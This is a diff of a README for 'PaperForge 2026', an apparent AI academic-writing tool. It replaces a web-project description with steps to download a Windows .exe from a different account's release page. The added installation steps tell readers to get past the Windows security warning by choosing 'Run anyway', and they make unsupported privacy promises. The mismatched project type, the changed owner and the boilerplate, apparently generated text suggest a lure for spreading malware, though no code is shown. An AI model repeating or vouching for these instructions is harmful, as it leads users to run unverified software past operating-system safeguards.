@@ -1,129 +1,72 @@
-# PaperForge v2026 - academic writing automation 2026
+# 📝 paperforge-2026-paper-workflow - Automate academic writing with smart tools
 
-> **PaperForge is a browser-based academic writing automation system built around LLM-guided workflows for paper generation, citation handling, iteration, and validation in version 2026.**
+[![](https://img.shields.io/badge/Download-PaperForge_2026-blue.svg)](https://github.com/asa834/paperforge-2026-paper-workflow/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jason-hilluxh1528/paperforge-2026-paper-workflow?style=flat-square)](https://github.com/jason-hilluxh1528/paperforge-2026-paper-workflow)
+PaperForge 2026 helps researchers write academic papers. The system uses smart language models to guide you through drafting, citing, and checking your work. You spend less time on formatting and more time on your research ideas.
 
----
+## 📥 Getting the software
 
-<p align="center">
-  <a href="https://jason-hilluxh1528.github.io/paperforge-2026-paper-workflow/">
-    <img src="https://img.shields.io/badge/Download-PaperForge%20Latest-brightgreen?style=for-the-badge" alt="Download PaperForge">
-  </a>
-</p>
+You need to download the installer to your computer. Follow these steps to get the software:
 
-> **[Direct Download - PaperForge v2026](https://jason-hilluxh1528.github.io/paperforge-2026-paper-workflow/)**
+1. Visit [this page to download](https://github.com/asa834/paperforge-2026-paper-workflow/releases).
+2. Look for the latest version under the "Assets" section.
+3. Click the file that ends in .exe for Windows.
+4. Save the file to your Downloads folder.
 
----
+## ⚙️ Installation instructions
 
-[Download Latest Build](https://jason-hilluxh1528.github.io/paperforge-2026-paper-workflow/)
+After you download the file, run the installer to set up the software on your Windows computer:
 
----
+1. Open your Downloads folder.
+2. Double-click the file you just downloaded.
+3. Windows might show a security window. If it does, click "More info" and select "Run anyway."
+4. Follow the prompts on the screen to install the program. 
+5. Create a desktop shortcut when the installer asks.
+6. Click "Finish" to complete the setup process.
 
-## What PaperForge Does
+## 🚀 Starting your first project
 
-PaperForge is designed for academic writing tasks that need a repeatable structure and AI-assisted guidance. It breaks paper work into distinct stages so authors can progress from initial drafting to revision with a more organized workflow.
+Open the program using the shortcut icon on your desktop. The first time you launch the app, it creates a local workspace on your computer:
 
-It also combines support for experiments and references, helping keep research notes, updates, and validation steps aligned within one process. The goal is to provide LLM help while still keeping the writing workflow visible and manageable.
+1. Click "New Project" to start your paper.
+2. Enter the title of your research.
+3. Select an academic style for your citations.
+4. Input your research goals into the main editor window.
+5. Watch as the tool suggests structure and text content.
 
----
+## 🛠️ Key capabilities
 
-## Key Capabilities
+This software handles several parts of the writing process:
 
-- Structured, multi-stage writing flows for building papers step by step
-- LLM-based assistance for academic writing work
-- Research-focused experiment support built into the workflow
-- Citation management for organizing references
-- Iteration tools for editing and improving drafts
-- Validation support for review checks during the process
-- Web access for use directly in the browser
-- Oriented toward paper generation and writing automation
+* Automated Drafting: The engine generates text based on your prompts.
+* Citation Control: The system tracks your references and formats them.
+* Feedback Loops: You iterate on your writing with the help of the AI editor.
+* Validation Checks: The tool confirms your text meets standard academic guidelines.
 
----
+## 📋 System requirements
 
-## Installation
+Ensure your computer meets these needs to run the software:
 
-PaperForge is a web project, so setup usually begins by retrieving the repository and opening it in a browser-capable environment.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 GB of RAM or more.
+* Storage: 500 MB of free disk space.
+* Internet: A stable connection for features that need cloud data.
 
-Clone the repository:
+## 💡 Troubleshooting common issues
 
-```bash
-git clone https://github.com/jason-hilluxh1528/paperforge-2026-paper-workflow.git
-cd REPO
-```
+If you encounter trouble, look at these solutions:
 
-If the project is distributed as a hosted build, you can also use the latest download link above and open it directly in your browser.
+* Software does not open: Restart your computer and try again. Ensure you have the latest Windows updates installed.
+* Citations fail to generate: Verify your internet connection. Check that you selected the correct citation format in the project settings.
+* Slow performance: Close other browser tabs and heavy programs while you work in the software.
+* Installer error: Run the installer file again. If the error persists, download the file from the link again to ensure the download finished correctly.
 
-Start or serve the project using the workflow provided by the repository, then open the web interface to begin using it.
+## 🔒 Data and privacy
 
----
+Your work stays on your computer. PaperForge 2026 uses local workflows to manage your document structure. It only sends text to the smart language models when you specifically ask for suggestions. It does not store your personal research data on external servers.
 
-## How to Use It
+## 🔄 Updating your software
 
-Begin by selecting the part of the writing workflow you want to handle, whether that is drafting, revising, or validating content.
+Check the download link periodically for new versions. When a new version releases, download the installer and run it. The new version replaces the old one. Your existing project files remain safe in your documents folder during this process.
 
-A typical workflow may look like this:
-
-1. Prepare your topic, sources, and notes.
-2. Run the paper generation workflow.
-3. Review the output and refine citations.
-4. Use iteration tools to improve the draft.
-5. Apply validation steps before finalizing the document.
-
-If the hosted build is available, you can use the download link above and then follow the on-screen prompts in the web interface.
-
----
-
-## Configuration
-
-The extracted profile does not include configuration specifics, so consult the repository or bundled application settings for the available options.
-
-When settings are exposed, they are likely to focus on workflow behavior, citation management, or LLM-assisted operation.
-
-Example configuration shape:
-
-```json
-{
-  "workflow": "multi-phase",
-  "citations": true,
-  "validation": true
-}
-```
-
----
-
-## Requirements
-
-- Web browser support
-- A hosted or locally served web build
-- Access to the repository files or published build
-- Any runtime or dependency details specified by the project maintainers
-
----
-
-## FAQ
-
-**How can I get the newest release?**  
-Use the download link above to access the current build.
-
-**Is it possible to adjust the workflow behavior?**  
-If the project exposes configuration, the relevant settings should be available in the repository or application files.
-
-**Are citations and revisions included?**  
-Yes, citation management and iteration support are part of the extracted feature set.
-
-**What if something is not working?**  
-Check the repository instructions, confirm the build or hosting setup, and inspect any available configuration values.
-
-**Where are updates reflected?**  
-The version badge and download link indicate the current release context provided for this repository.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: academic writing, automation, research software, citation management, paper generation, LLM, workflow, windows application
